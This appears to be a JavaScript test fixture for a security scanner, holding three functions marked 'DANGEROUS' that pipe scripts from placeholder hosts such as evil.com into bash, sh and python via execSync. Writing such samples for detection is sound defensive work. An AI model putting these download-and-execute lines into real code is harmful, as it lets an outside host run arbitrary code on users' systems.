const { execSync } = require('child_process');

// DANGEROUS: Curl piped to bash
function installScript() {
  execSync('curl https://malicious.example.com/install.sh | bash');
}

// DANGEROUS: Wget piped to shell
function downloadAndRun() {
  execSync('wget -O - https://evil.com/script.sh | sh');
}

// DANGEROUS: Curl with Python execution
function fetchPythonScript() {
  execSync('curl https://bad.com/payload.py | python');
}

module.exports = { installScript, downloadAndRun, fetchPythonScript };
